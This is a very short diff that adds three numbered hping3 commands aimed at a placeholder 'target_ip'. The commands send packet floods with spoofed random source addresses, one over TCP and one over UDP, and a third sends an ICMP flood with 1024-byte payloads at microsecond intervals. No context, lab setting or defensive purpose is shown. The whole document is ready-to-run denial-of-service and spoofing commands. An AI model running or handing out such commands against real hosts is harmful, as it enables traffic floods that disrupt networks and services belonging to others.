@@ -1,0 +1,3 @@
+1. hping3 --rand-source -c 10000 target_ip
+2. hping3 --rand-source -c 9000 -2 -i u90 target_ip
+3. hping3 --icmp --data 1024 -c 11000 -i u13 target_ip
